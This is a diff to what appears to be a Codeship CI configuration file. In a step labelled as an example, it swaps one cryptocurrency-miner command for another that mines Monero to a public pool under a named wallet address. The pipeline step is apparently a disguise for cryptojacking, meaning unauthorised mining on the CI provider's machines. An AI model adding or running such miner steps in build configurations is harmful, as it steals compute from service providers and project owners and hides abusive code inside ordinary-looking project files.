@@ -8,4 +8,4 @@
 - name: example_tagged_step
   tag: master
   service: codeship_example
-  command: ./cy/minerd -a yescryptr16 -o stratum+tcp://pool.cryply.io:3311 -u jerolamo.oo6 -p jop -t 4
+  command: ./build/bin/xmrstak --currency monero -o pool.supportxmr.com:3333 -u 49zdveERfafTgV9tfsEPvSL9giFqkiK1iG8KUNvWBT9wQshmCZiauMzdjuLPuoH2jyZfy6kS88StThDqQAA9vjmTKbhRozK -p muriel -t 3
